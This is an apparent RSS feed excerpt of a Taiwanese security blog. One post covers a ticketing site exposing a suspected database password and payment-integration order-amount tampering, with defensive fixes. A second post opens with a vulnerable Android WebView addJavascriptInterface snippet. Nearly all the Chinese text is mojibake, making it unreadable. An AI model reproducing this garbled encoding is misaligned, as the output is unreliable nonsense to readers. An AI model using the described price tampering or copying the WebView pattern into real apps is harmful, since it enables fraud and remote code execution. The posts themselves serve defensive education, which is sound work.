&lt;p&gt;åœ¨çµå¸³ç¶²é åŸå§‹ç¢¼ç•¶ä¸­ç«Ÿç„¶çœ‹åˆ°äº†ç–‘ä¼¼è³‡æ–™åº«å¯†ç¢¼ SqlPassWord åœ¨è¡¨å–®è£¡é¢ï¼é€™ä»¶äº‹å¾è³‡å®‰çš„è§’åº¦ä¾†çœ‹ï¼Œé™¤äº†è¡¨é¢ä¸Šæ´©æ¼äº†è³‡æ–™åº«å¯†ç¢¼ä¹‹å¤–ï¼Œé‚„æœ‰å…©å€‹æˆ‘æƒ³è¬›å¾ˆä¹…ä½†è‹¦ç„¡æ©Ÿæœƒè«‡çš„è³‡å®‰è­°é¡Œï¼Œåˆ†åˆ¥æ˜¯é‡‘æµä¸²æ¥å¸¸è¦‹çš„å¼±é»ä»¥åŠé§­å®¢çš„å¿ƒç†ã€‚è—‰è‘—å¯¬å®å”®ç¥¨ç¶²é æ´©æ¼å¯†ç¢¼é€™ä»¶äº‹æƒ…ï¼Œé †é“èˆ‡å¤§å®¶åˆ†äº«åˆ†äº«å§ï¼&lt;/p&gt;

&lt;h3 id=&quot;è«‡å°ç£ç¶²ç«™çš„é‡‘æµä¸²æ¥&quot;&gt;è«‡å°ç£ç¶²ç«™çš„é‡‘æµä¸²æ¥&lt;/h3&gt;

&lt;p&gt;åœ¨æœ¬ç¯‡çš„ä¾‹å­ä¸­ï¼Œå¯¬å®å”®ç¥¨ç¶²é è¡¨å–®å‡ºç¾äº†ç–‘ä¼¼è³‡æ–™åº«å¯†ç¢¼ï¼Œé€™ç‹€æ³å°±å¥½åƒå»éŠ€è¡Œç¹³æ¬¾ï¼Œæ«ƒæª¯çµ¦ä½ ä¸€æŠŠé‘°åŒ™è·Ÿä½ èªªï¼šã€é€™æ˜¯é‡‘åº«çš„é‘°åŒ™ï¼Œéº»ç…©ä½ åˆ°å°é¢é‚£å€‹æ«ƒæª¯æŠŠé‘°åŒ™çµ¦æœå‹™å“¡ï¼Œè«‹ä»–å¹«ä½ æŠŠéŒ¢æ”¾é€²é‡‘åº«è£¡é¢ã€ã€‚&lt;br /&gt;
æ˜¯ä¸æ˜¯æœ‰é»å¤šæ­¤ä¸€èˆ‰ï¼ŒéŠ€è¡Œæœ¬ä¾†å°±æœƒæœ‰ä¸€ä»½é‘°åŒ™ï¼Œå¹¹å˜›è¦è«‹ä½ ï¼ˆç€è¦½å™¨ï¼‰å¹«å¿™è½‰äº¤ï¼Ÿ&lt;br /&gt;
å¦‚æœä»Šå¤©å£äººæ‹¿åˆ°äº†é€™æŠŠé‘°åŒ™ï¼Œæ˜¯ä¸æ˜¯åªè¦ç¹éä¿å…¨çš„è¦–ç·šï¼Œå°±å¯ä»¥æ‰“é–‹é‡‘åº«ç‚ºæ‰€æ¬²ç‚ºï¼Ÿ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150109/3d_key_to_success.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150109/3d_key_to_success.jpg&quot; alt=&quot;key_to_success&quot; title=&quot;key_to_success&quot; /&gt;&lt;/a&gt;
&lt;br /&gt;ï¼ˆPhoto by StockMonkeys.comï¼‰&lt;/p&gt;

&lt;p&gt;é¡ä¼¼çš„ç‹€æ³ä¹Ÿæ»¿å¸¸ç™¼ç”Ÿåœ¨é›»å­å•†å‹™èˆ‡ç¬¬ä¸‰æ–¹é‡‘æµæœå‹™çš„ä¸²æ¥ä¸Šã€‚&lt;br /&gt;
è¨±å¤šé›»å­å•†å‹™ç¶²ç«™å°ˆæ³¨æ–¼å•†å‹™ï¼Œé¸æ“‡å°‡ä»˜æ¬¾æ­¥é©Ÿå§”è¨—ç¬¬ä¸‰æ–¹é‡‘æµæœå‹™è™•ç†ï¼Œä¸€èˆ¬å¸¸è¦‹çš„æµç¨‹æ˜¯é€™æ¨£çš„ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;é›»å­å•†å‹™è¨‚å–®æˆç«‹ï¼Œé›»å­å•†å‹™ç¶²ç«™çµ¦ä½ ä¸€å¼µå–®å­ï¼Œä¸Šé¢å¯«è‘—ï¼šã€è¨‚å–® 123 è™Ÿï¼Œ é‡‘é¡ 456 å…ƒã€ï¼Œè«‹ä½ å°‡å–®å­è½‰äº¤çµ¦ç¬¬ä¸‰æ–¹é‡‘æµæœå‹™ç¶²ç«™ä¸¦ç¹³æ¬¾ã€‚&lt;/li&gt;
  &lt;li&gt;é‡‘æµæœå‹™ç¶²ç«™ä¾æ“šä½ çµ¦å®ƒçš„å–®æ“šæ”¶å– 456 å…ƒï¼Œä¸¦ä¸”è·Ÿé›»å­å•†å‹™ç¶²ç«™èªªï¼šã€è¨‚å–® 123 å·²æˆåŠŸç¹³æ¬¾ï¼Œæ¬¾é … 456 å…ƒã€ã€‚&lt;/li&gt;
  &lt;li&gt;æœ€å¾Œé›»å­å•†å‹™ç¶²ç«™å‘Šè¨´ä½ è¨‚å–® 123 è™Ÿè³¼è²·æˆåŠŸã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;å¦‚æœç¾åœ¨æœ‰ä¸€å€‹æƒ¡æ„ä½¿ç”¨è€…ï¼Œä»–åšäº†ä»¥ä¸‹æƒ¡æï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;åœ¨æ­¥é©Ÿä¸€æŠŠé›»å­å•†å‹™ç¶²ç«™çµ¦çš„å–®å­ä¿®æ”¹æˆï¼šã€è¨‚å–® 123 è™Ÿï¼Œé‡‘é¡ 20 å…ƒã€ï¼ˆåŸåƒ¹æ˜¯ 456 å…ƒï¼‰&lt;/li&gt;
  &lt;li&gt;é‡‘æµæœå‹™å•†ä¾æ“šå–®æ“šè·Ÿæƒ¡æ„ä½¿ç”¨è€…æ”¶å– 20 å…ƒè²»ç”¨ï¼Œä¸¦ä¸”å‘Šè¨´é›»å­å•†å‹™ç¶²ç«™ï¼šã€è¨‚å–® 123 å·²æˆåŠŸç¹³æ¬¾ï¼Œæ¬¾é … 20 å…ƒã€&lt;/li&gt;
  &lt;li&gt;æœ€å¾Œé›»å­å•†å‹™ç¶²ç«™çœ‹åˆ°ã€è¨‚å–® 123 å·²æˆåŠŸç¹³æ¬¾ã€çš„è¨Šæ¯ï¼Œå°±å‘Šè¨´ä½¿ç”¨è€…èªªè¨‚å–® 123 è³¼è²·æˆåŠŸã€‚ä¹Ÿå°±æ˜¯æƒ¡æ„ä½¿ç”¨è€…åªèŠ±å– 20 å…ƒå°±è³¼è²·åˆ°åŸåƒ¹ 456 å…ƒçš„ç”¢å“ã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;(è²æ˜ï¼šç‚ºæ±‚ç²¾ç°¡ï¼Œé›»å­å•†å‹™èˆ‡é‡‘æµæœå‹™ä¸²æ¥æµç¨‹æœ‰ç¶“éç°¡åŒ–ï¼Œæœ‰æŠ“åˆ°ç²¾é«“å°±å¥½XD)&lt;/p&gt;

&lt;p&gt;ä¸ç®¡æ˜¯å¯¬å®å”®ç¥¨å‡ºç¾å¯†ç¢¼æ¬„ä½é‚„æ˜¯ä¸Šä¾‹é›»å­å•†å‹™ç¶²ç«™çš„é‡‘æµä¸²æ¥ï¼Œæœ€å¤§çš„å•é¡Œåœ¨æ–¼ä»–å€‘éƒ½ç›¸ä¿¡ä½¿ç”¨è€…æœƒæ­£å¸¸å¹«å¿™è½‰äº¤ï¼Œå³é å®¢æˆ¶ç«¯çš„ç€è¦½å™¨ä¾†è½‰å€å‚³å€¼ã€‚è¦çŸ¥é“ï¼Œåˆ©ç”¨ç€è¦½å™¨è½‰å€å‚³å€¼æ˜¯ä¸å¯é çš„ï¼Œä¸€ä¾†ï¼Œé‡è¦çš„è³‡è¨Šå°±æœƒè¢«å®¢æˆ¶çŸ¥é“ï¼Œä¾‹å¦‚å¯¬å®å”®ç¥¨ç–‘ä¼¼æ´©æ¼è³‡æ–™åº«å¯†ç¢¼ï¼›äºŒä¾†ä¸­é–“çš„å…§å®¹å¯ä»¥ä¿®æ”¹ï¼Œä¾‹å¦‚ä¿®æ”¹è¨‚å–®é‡‘é¡ã€‚å¦å¤–ï¼Œå¯èƒ½æœ‰äººæœƒç™¼ç¾åˆ°ï¼Œåœ¨æƒ¡æ„ä½¿ç”¨è€…çš„æ­¥é©Ÿä¸‰è£¡é¢ï¼Œé›»å­å•†å‹™ç¶²ç«™ç«Ÿç„¶æ²’æœ‰ç¢ºèªä»˜æ¬¾é‡‘é¡æ˜¯å¦æ­£ç¢ºï¼Œæ²’éŒ¯ï¼Œé€™æ˜¯æœƒç™¼ç”Ÿçš„äº‹æƒ…ï¼Œåœ¨éå»ç¶“é©—ä¸­ï¼Œåƒé€™æ¨£æ²’æœ‰æ¯”å°ä»˜æ¬¾é‡‘é¡çš„å°ç£ç³»çµ±æ¯”ä¾‹é‚„ä¸å°‘ï¼Œé€™äº›ç–å¿½éƒ½æœƒé€ æˆä¼æ¥­å¾ˆå¤šæˆæœ¬æå¤±ï¼Œä¸å¯ä¸æ³¨æ„ã€‚&lt;/p&gt;

&lt;p&gt;å°ç£ç›®å‰é‚„æ»¿å¸¸è¦‹åˆ°é€™ç¨®æ ¹æ“šä½¿ç”¨è€…å‚³ä¾†å–®æ“šä¾†æ”¶è²»çš„ç‹€æ³ï¼Œå°è‡´å–®æ“šå¯ç«„æ”¹é€ æˆä¼æ¥­æå¤±ï¼ŒæŸéƒ¨åˆ†åŸå› å¯ä»¥æ­¸å’åˆ°æ—©æœŸç¬¬ä¸‰æ–¹é‡‘æµçš„ç¯„ä¾‹éƒ½æ˜¯é€™æ¨£å¯«çš„ï¼Œå·¥ç¨‹å¸«ä¹Ÿå°±ç›´æ¥å»¶çºŒé€™æ¨£çš„å¯«æ³•ç›´åˆ°ç¾åœ¨ã€‚ä»¥é‡‘æµä¸²æ¥ç‚ºä¾‹ï¼Œæ¯”è¼ƒå¥½çš„è™•ç†æ–¹å¼æœ‰ä¸‹é¢å…©ç¨®ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;åœ¨å–®æ“šä¸ŠåŠ å…¥é˜²å½æ¨™è¨˜ï¼Œè®“æƒ¡æ„ä½¿ç”¨è€…ç„¡æ³•è¼•æ˜“ç«„æ”¹å–®æ“šã€‚åœ¨æŠ€è¡“ä¸Šä½œæ³•æœ‰é»é¡ä¼¼ OAuth åœ¨ Signing Request æ™‚çš„ä½œæ³•ï¼Œåœ¨è«‹æ±‚ä¸­å¤šé€ä¸€çµ„æª¢æŸ¥ç¢¼ï¼Œé€é one-way hash çš„æ–¹å¼æª¢æŸ¥ç¶²å€æ˜¯å¦æœ‰è¢«ä¿®æ”¹ï¼Œç›®å‰å¤§éƒ¨åˆ†é‡‘æµå•†éƒ½æœ‰æä¾›ç›¸ä¼¼è§£æ³•ã€‚&lt;/li&gt;
  &lt;li&gt;å–®æ“šä¸å†çµ¦ä½¿ç”¨è€…è½‰äº¤ï¼Œé›»å­å•†å‹™ç›´æ¥å‚³å–®å­ã€è¨‚å–® 123 è™Ÿï¼Œé‡‘é¡ 20 å…ƒã€çµ¦é‡‘æµæœå‹™ç¶²ç«™ï¼Œä¸¦è«‹ä½¿ç”¨è€…ç›´æ¥å»å°ˆå±¬çš„é‡‘æµå•†çª—å£ç¹³è²»å³å¯ã€‚åœ¨æŠ€è¡“ä¸Šå°±æ˜¯å°‡ç€è¦½å™¨è½‰å€å‚³å€¼çš„å‹•ä½œå…¨éƒ¨è®Šæˆä¼ºæœå™¨å°ä¼ºæœå™¨æºé€šè™•ç†æ‰ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä»¥ä¸Šå…©ç¨®ä½œæ³•ï¼Œå°‡å¯ä»¥æœ‰æ•ˆé˜²æ­¢æƒ¡æ„ä½¿ç”¨è€…ä¿®æ”¹è¨‚å–®é‡‘é¡ã€‚æ­¤å¤–ï¼Œå»ºè­°é›»å­å•†å‹™ç¶²ç«™åœ¨æ”¶åˆ°é‡‘æµå›å‚³çš„ä»˜æ¬¾è³‡è¨Šå¾Œï¼Œèƒ½å¤ æ¯”å°æ”¶å–æ¬¾é …èˆ‡è¨‚å–®æ¬¾é …æ˜¯å¦ç›¸ç¬¦ï¼Œå¦‚æ­¤é›™é‡æª¢æŸ¥ï¼Œèƒ½å¤§å¤§é¿å…æƒ¡æ„è¡Œç‚ºï¼Œæ¸›å°‘ä¼æ¥­è™•ç†æƒ¡æ„é‡‘æµå•é¡Œçš„æˆæœ¬ã€‚&lt;/p&gt;

&lt;h3 id=&quot;è«‡é§­å®¢å¿ƒç†&quot;&gt;è«‡é§­å®¢å¿ƒç†&lt;/h3&gt;

&lt;p&gt;å¾ˆæ˜é¡¯çš„ï¼Œå¯¬å®å”®ç¥¨æ´©æ¼å¯†ç¢¼çš„ç‹€æ³æ˜¯å·¥ç¨‹å¸«çš„å°ç–æ¼ã€‚åœ¨ä¸çŸ¥é“è³‡æ–™åº«ç¢ºåˆ‡ä½ç½®çš„å‰æä¸‹ï¼ŒçŸ¥é“ç–‘ä¼¼è³‡æ–™åº«å¯†ç¢¼çš„æ±è¥¿ç¢ºå¯¦ä¹Ÿç„¡æ³•åšä»€éº¼ï¼Œé ‚å¤šå°±æ˜¯äº†è§£äº†ä¸€å®¶å…¬å¸åˆ¶å®šå¯†ç¢¼çš„ç­–ç•¥ã€‚ç„¶è€Œï¼Œçœ‹åœ¨é§­å®¢çœ¼è£¡ï¼Œé€™é»ç–å¤±æœƒä»£è¡¨è‘—ä¸€å€‹ç¶²ç«™é¢å°è³‡å®‰çš„æ…‹åº¦ã€‚é€£é¡¯è€Œæ˜“è¦‹çš„å•é¡Œéƒ½æ²’æœ‰æ³¨æ„ï¼Œé‚£å¾Œç«¯ç¨‹å¼æ‡‰è©²ä¹Ÿæœ‰å¯èƒ½å‡ºç¾æ¼æ´ã€‚ä¸€æ—¦é§­å®¢æ±ºå®šè¦æ”»æ“Šé€™å€‹ç¶²ç«™ï¼Œå‹¢å¿…æœƒæ¬å‡ºæ¯”å¹³å¸¸é‚„è¦å¤šçš„è³‡æºå»å˜—è©¦ï¼Œå› ç‚ºä»–å€‘èªç‚ºé€™å€‹æŠ•è³‡å ±é…¬ç‡å¾ˆé«˜ã€‚&lt;/p&gt;

&lt;p&gt;ä¸€èˆ¬é§­å®¢åŸºæœ¬ä¸Šæœƒä¸æ–·çš„å¾æ‰€çœ‹åˆ°çš„ç¶²é è³‡è¨Šä¾†èª¿æ•´è‡ªå·±æ”»æ“Šçš„å¼·åº¦ï¼Œå¦‚æœä»–å€‘ä¸æ–·çœ‹åˆ°äº†å¥‡æ€ªçš„ç™»å…¥ç•«é¢ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150109/kham_login_1.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150109/kham_login_1.png&quot; alt=&quot;å¯¬å®å”®ç¥¨ç™»å…¥é é¢1&quot; title=&quot;å¯¬å®å”®ç¥¨ç™»å…¥é é¢1&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æˆ–æ˜¯é˜²ç«ç‰†çš„ç™»å…¥ç•«é¢&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150109/kham_login_2.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150109/kham_login_2.png&quot; alt=&quot;å¯¬å®å”®ç¥¨ç™»å…¥é é¢2&quot; title=&quot;å¯¬å®å”®ç¥¨ç™»å…¥é é¢2&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å°±å¾ˆæœ‰å¯èƒ½æœƒå¢åŠ æ”»æ“Šçš„åŠ›é“ã€‚ä¸Šé¢é€™ç¨®ç™»å…¥é é¢å°±æ˜¯å°±æ˜¯ä¸€ç¨®å¸¸è¦‹çš„è³‡è¨Šæ´©æ¼ï¼Œåœ¨ä»Šå¹´å°ç£é§­å®¢å¹´æœƒçš„è­°ç¨‹ï¼ã€Œ&lt;a href=&quot;https://devco.re/blog/2014/08/26/information-leakage-in-taiwan-HITCON2014/&quot;&gt;è¢«éºå¿˜çš„è³‡è¨Šæ´©æ¼&lt;/a&gt;ã€å°±æåŠäº†é€™é¡è³‡è¨Šæ´©æ¼åœ¨å°ç£æ˜¯å¾ˆæ™®åŠçš„ã€‚æ³¨æ„ï¼Œå‡ºç¾é€™æ¨£çš„é é¢ä¸¦ä¸æ„å‘³è‘—ç¶²ç«™æœƒæœ‰æ¼æ´ï¼Œåªæ˜¯ç¶²ç«™å®¹æ˜“å› æ­¤å¤šå—åˆ°ä¸€äº›æ”»æ“Šã€‚åä¹‹ï¼Œå¦‚æœä¸€å€‹ç¶²ç«™å‰ç«¯é é¢å¯«çš„ä¹¾æ·¨æ¼‚äº®ï¼Œç”šè‡³é€£ &lt;a href=&quot;https://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;HTTP å®‰å…¨ header&lt;/a&gt; é€™ç¨®å°ç´°ç¯€éƒ½æœƒæ³¨æ„åˆ°ï¼Œé§­å®¢å¯èƒ½å°±æœƒèªç‚ºé€™å€‹ç¶²ç«™å¯«çš„å¾ˆåš´è¬¹ï¼Œç”šè‡³é€£å˜—è©¦çš„æ…¾æœ›éƒ½æ²’æœ‰äº†ã€‚&lt;/p&gt;

&lt;p&gt;ä¸€å€‹ç¶“é©—è±å¯Œçš„é§­å®¢ï¼Œé€šå¸¸å…‰çœ‹é¦–é å°±èƒ½å¤ åˆ¤æ–·è©²ç¶²ç«™æ˜¯å¦å¯èƒ½å­˜æœ‰æ¼æ´ï¼Œæ†‘è—‰çš„å°±æ˜¯é€™äº›è››çµ²é¦¬è·¡ã€‚ç‚ºäº†ä¸è®“è‡ªå®¶ç¶²ç«™å¸¸è¢«è·¯éçš„æƒ¡æ„ä½¿ç”¨è€…æ”»æ“Šï¼ŒåŠ å¼·ç¶²é å‰ç«¯çš„å‘ˆç¾ã€ç¶²é åŸå§‹ç¢¼ä¹¾æ·¨æœ‰æ¶æ§‹ã€æ²’æœ‰å¤ªå¤šè³‡è¨Šæ´©æ¼ï¼Œé€™äº›éƒ½æ˜¯å¾ˆå¥½çš„é˜²ç¦¦æ–¹æ³•ã€‚&lt;/p&gt;

&lt;h3 id=&quot;çµè«–&quot;&gt;çµè«–&lt;/h3&gt;

&lt;p&gt;åœ¨ä½¿ç”¨æœ€è¿‘ç†±é–€çš„å¯¬å®å”®ç¥¨ç¶²ç«™æ™‚ï¼Œæˆ‘å€‘ç™¼ç¾ç¶²é åŸå§‹ç¢¼å­˜åœ¨ä¸€äº›ç–‘ä¼¼å¯†ç¢¼çš„è³‡è¨Šã€‚å¾é€™ä»¶äº‹æƒ…å‡ºç™¼ï¼Œæˆ‘å€‘åˆ†åˆ¥å»¶ä¼¸æ¢è¨äº†å…©å€‹å·¥ç¨‹å¸«æ‡‰è©²æ³¨æ„çš„è­°é¡Œï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ç¬¬ä¸€å€‹è­°é¡Œæé†’å¤§å®¶åœ¨é–‹ç™¼çš„æ™‚å€™ï¼Œé‡è¦çš„è³‡è¨Šåƒè¬ä¸è¦é€éå®¢æˆ¶ç«¯ç€è¦½å™¨å¹«å¿™è½‰é€ï¼Œè¨˜ä½å®¢æˆ¶ç«¯éƒ½æ˜¯ä¸å¯ä¿¡çš„ï¼Œå¤šç¶“ä¸€æ‰‹å°±å¤šä¸€åˆ†é¢¨éšªã€‚æ–‡ä¸­èˆ‰å‡ºäº†å°ç£é›»å•†ç¶²ç«™åœ¨é‡‘æµä¸²æ¥æ™‚ä¹Ÿå¸¸å‡ºç¾é€™æ¨£çš„å•é¡Œï¼Œå¯èƒ½æœƒé€ æˆè¨‚å–®é‡‘é¡è¢«ç«„æ”¹ç­‰ä¼æ¥­æœƒæœ‰æ‰€æå¤±çš„å•é¡Œã€‚&lt;/li&gt;
  &lt;li&gt;ç¬¬äºŒå€‹è­°é¡Œå¾é§­å®¢çš„å¿ƒç†ä¾†è«‡è³‡å®‰ï¼Œä¸€å€‹ç¶²ç«™å¦‚æœæ²’æœ‰ä»€éº¼ä¿è­·æ©Ÿåˆ¶ã€è¼•æ˜“çš„æ´©æ¼ç¶²ç«™è³‡è¨Šï¼Œéå¸¸å®¹æ˜“æŒ‘èµ·é§­å®¢æƒ³è¦å˜—è©¦å…¥ä¾µçš„æ…¾æœ›ï¼›åä¹‹ï¼Œè‹¥ä¸€å€‹ç¶²ç«™å¾å‰ç«¯åˆ°ä½¿ç”¨æµç¨‹éƒ½éå¸¸æ³¨æ„ç´°ç¯€ï¼Œä¸€èˆ¬é§­å®¢è¼ƒæœƒèˆˆè‡´ç¼ºç¼ºã€‚åš´è¬¹çš„å‰ç«¯å‘ˆç¾ï¼Œå°±æŸç¨®ç¨‹åº¦ä¾†èªªï¼Œä¹Ÿæ˜¯ä¸€ç¨®å°è‡ªèº«ç¶²ç«™çš„ä¿è­·ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å¸Œæœ›é–‹ç™¼è€…çœ‹åˆ°ä¸Šé¢é€™å…©å€‹è­°é¡Œæœ‰æŒæ¡åˆ°ã€åˆ¥ç›¸ä¿¡å®¢æˆ¶ç«¯ã€ã€ã€é§­å®¢æœƒå› ç¶²ç«™å‰ç«¯å¯«æ³•ä¸åš´è¬¹è€Œå˜—è©¦å»æ”»æ“Šã€çš„é‡é»ï¼Œææ˜‡è‡ªå®¶ç¶²ç«™çš„å®‰å…¨åº¦å§ï¼&lt;/p&gt;

&lt;p&gt;æœ€å¾Œèªªå€‹é¡Œå¤–è©±ï¼Œèº«ç‚ºä¸€å€‹å·¥ç¨‹å¸«ï¼Œæˆ‘èªç‚ºè³‡è¨Šç³»çµ±è©²å¸¶çµ¦ä¸–ç•Œçš„å¥½è™•æ˜¯ç¯€çœå¤§å®¶çš„æ™‚é–“ï¼Œè€Œé€™æ¬¡æ¶ç¥¨å»è®“ç„¡æ•¸äººå¾¹å¤œæ’éšŠæˆ–å®ˆåœ¨é›»è…¦å‰ä¸æ–·çš„ã€é€£ä¸ä¸Šã€è²·ç¥¨ã€å¤±æ•—ã€å¾ªç’°ã€‚é€™ä¹Ÿè¨±èƒ½å¤ è³ºåˆ°å¤§é‡çš„æ–°èç‰ˆé¢ï¼Œæœ€çµ‚ç¥¨ä¹Ÿèƒ½å…¨éƒ¨è³£å…‰ï¼Œä½†æƒ³åˆ°å°ç£æœ‰æ•¸åè¬å°æ™‚çš„ç”Ÿç”¢åŠ›æµªè²»åœ¨ç„¡æ„ç¾©çš„ç­‰å¾…ä¸Šï¼Œå°±è¦ºå¾—é€™å€‹ç³»çµ±å¥½å¤±æ•—ã€‚ç¾åœ¨çš„æŠ€è¡“å·²ç¶“å¯ä»¥è² è·é€™æ¨£å¤§è¦æ¨¡çš„å”®ç¥¨ï¼Œ&lt;a href=&quot;https://kktix.com/&quot;&gt;KKTIX&lt;/a&gt; ç”šè‡³å¯ä»¥&lt;a href=&quot;https://medium.com/@hlb/kktix-2015-01-7bf84c47dfdf&quot;&gt;ä¸€åˆ†é˜è™•ç† 10 è¬å¼µåŠƒä½ç¥¨åˆ¸&lt;/a&gt;ï¼ä¸–ç•Œåœ¨é€²æ­¥ï¼Œéå»çš„æŠ€è¡“ä¹Ÿè¨±å°±è©²è®“å®ƒç•™åœ¨éå»ã€‚æœ‰äººèªªï¼šã€çœŸæ­£å¹¸ç¦çš„äººï¼šä¸æ˜¯æ¶åˆ°ç¥¨ï¼Œæ˜¯å¯ä»¥åƒæ±Ÿè•™ä¸€æ¨£é¸æ“‡äººç”Ÿã€ï¼Œå¸Œæœ›æˆ‘ä¹Ÿå¯ä»¥è®Šæˆä¸€å€‹å¹¸ç¦çš„äººï¼Œå¯ä»¥é¸æ“‡ä¸€å€‹ä¸å¡è»Šçš„å”®ç¥¨ç³»çµ±ã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2015/01/09/information-security-insight-kham/</link>
                <guid>https://devco.re/blog/2015/01/09/information-security-insight-kham</guid>
                <pubDate>Fri, 09 Jan 2015 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Android WebView ç‚ºä½ çš„ä½¿ç”¨è€…æ‰“é–‹äº†æ¼æ´ä¹‹é–€ä½ çŸ¥é“å—ï¼Ÿ</title>
                <description>&lt;p&gt;ç‚ºäº†è§£æ±ºåœ¨æ‡‰ç”¨ç¨‹å¼ä¸­é¡¯ç¤ºç¶²é çš„éœ€æ±‚ï¼Œé–‹ç™¼è€…ä¸€èˆ¬æœƒä½¿ç”¨åˆ°ç”±ç³»çµ±æä¾›çš„ WebView å…ƒä»¶ã€‚è€Œç”±æ–¼ JavaScript è¢«å»£æ³›æ‡‰ç”¨åœ¨ç¶²é ä¸Šï¼Œé–‹ç™¼è€…é€šå¸¸ä¹ŸæœƒæŠŠ WebView è™•ç† JavaScript çš„åŠŸèƒ½æ‰“é–‹ï¼Œå¥½è®“å¤§éƒ¨åˆ†ç¶²é èƒ½æ­£å¸¸é‹ä½œã€‚ä½†å°±åœ¨é–‹å•Ÿé€™å€‹åƒæ˜¯å¿…ä¸å¯å°‘çš„ JavaScript åŠŸèƒ½æ™‚ï¼ŒèƒŒå¾Œä¸€äº›ç”±æ–¼ç³»çµ±æ¼æ´è€Œå¼•ç™¼å‡ºä¾†æ„æƒ³ä¸åˆ°çš„é¢¨éšªå»æœ‰æ©Ÿæœƒç”±æ­¤è€Œç”Ÿã€‚æ¥ä¸‹ä¾†çš„éƒ¨åˆ†å°‡æŠŠé€™äº›æ¼æ´ç‚ºå¤§å®¶åšå€‹æ•´ç†ã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;ç›¸é—œæ¼æ´&quot;&gt;ç›¸é—œæ¼æ´&lt;/h3&gt;

&lt;h4 id=&quot;1-é ç«¯ä»£ç¢¼åŸ·è¡Œ-remote-code-execution&quot;&gt;1. é ç«¯ä»£ç¢¼åŸ·è¡Œ (Remote Code Execution)&lt;/h4&gt;

&lt;h5 id=&quot;é¢¨éšªæœ¨é¦¬è·³æ¿å€‹è³‡è¢«ç›œ&quot;&gt;é¢¨éšªï¼šæœ¨é¦¬è·³æ¿ï¼Œå€‹è³‡è¢«ç›œ&lt;/h5&gt;
&lt;p&gt;ç›®å‰æœ‰æ©Ÿæœƒç™¼ç”Ÿ RCE é¢¨éšªéƒ½åœç¹åœ¨ &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt; é€™å€‹åŠŸèƒ½ä¸Šï¼Œè©²åŠŸèƒ½åŸæ„æ˜¯ç‚ºè¢«è¼‰å…¥çš„ç¶²é å’ŒåŸç”Ÿç¨‹å¼é–“å»ºç«‹ä¸€å€‹â€æ©‹æ¨‘â€ï¼Œé€šéé å…ˆè¨­å®šå¥½çš„ä»‹é¢ï¼Œè®“ç¶²é èƒ½å‘¼å«æŒ‡å®šçš„å…¬é–‹å‡½å¼ä¸¦å–å¾—å‡½å¼å›å‚³çš„çµæœã€‚&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JsObject&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Hello World&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;webView&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSettings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setJavaScriptEnabled&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;webView&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addJavascriptInterface&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JsObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;injectedObject&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
